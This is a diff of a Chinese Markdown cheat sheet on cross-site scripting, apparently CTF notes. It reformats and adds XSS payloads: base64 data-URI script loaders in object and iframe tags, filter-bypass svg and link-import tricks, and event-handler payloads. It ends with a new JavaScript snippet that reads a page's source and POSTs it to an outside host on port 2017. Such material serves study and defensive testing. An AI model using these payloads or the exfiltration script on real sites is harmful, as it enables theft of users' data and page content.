@@ -204,11 +204,11 @@ XSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，
 
 >  <meta http-equiv="Refresh" content="0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+">
 
-<object>则可以使用,<iframe>也行。
+`<object>则可以使用,<iframe>也行。`
 
-> <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+"></object>
->
-> <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+"></iframe>
+`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+"></object>`
+
+`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+"></iframe>`
 
 ## simple xss
 
@@ -219,7 +219,7 @@ XSS payload只允许使用大小写字母数字加上`<^*~\-|_=+`这些特殊符
 
 比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队<https://ctftime.org/writeup/5956> 脑洞出来了个奇葩思路
 
-><svg id=\ onload=location=id+id+12345609861+domain+id+1234+id 
+`><svg id=\ onload=location=id+id+12345609861+domain+id+1234+id `
 
 我们（nao）想（dong）出来的payload有如下几个关键点：
 
@@ -229,7 +229,7 @@ XSS payload只允许使用大小写字母数字加上`<^*~\-|_=+`这些特殊符
 
 综上，payload:
 
-> <link rel=import href=\\example。com\xssHtml other= 
+`> <link rel=import href=\\example。com\xssHtml other= `
 
 ## RSS中的XSS
 
@@ -448,4 +448,43 @@ payload:
 ```
 " onmouseover=alert(1) //
 ```
+
+## xsspayload:
+
+`<img src=//eval.com:2222>`
+
+`<svg onload=prompt(/xss/)>`
+
+`<embed/src=//goo.gl/nlX0P>`
+
+`<marquee/onstart=confirm(2)>`
+
+## xss 读源码
+
+```
+function send(e) {
+    var t = new XMLHttpRequest;
+    t.open("POST", "//eval.com:2017", !0),
+    t.setRequestHeader("Content-type", "text/plain"),
+    t.onreadystatechange = function() {
+        4 == t.readyState && t.status
+    },
+    t.send(e);
+}
+function getsource(src){
+    var t = new XMLHttpRequest;
+    t.open("GET", src, !0),
+    t.setRequestHeader("Content-type", "text/plain"),
+    t.onreadystatechange = function() {
+        4 == t.readyState && t.status
+    },
+    t.onload=function(e){
+        send(e.target.responseText);
+    }
+    t.send();
+}
+getsource("/home/publiclist");
+```
+
+
 
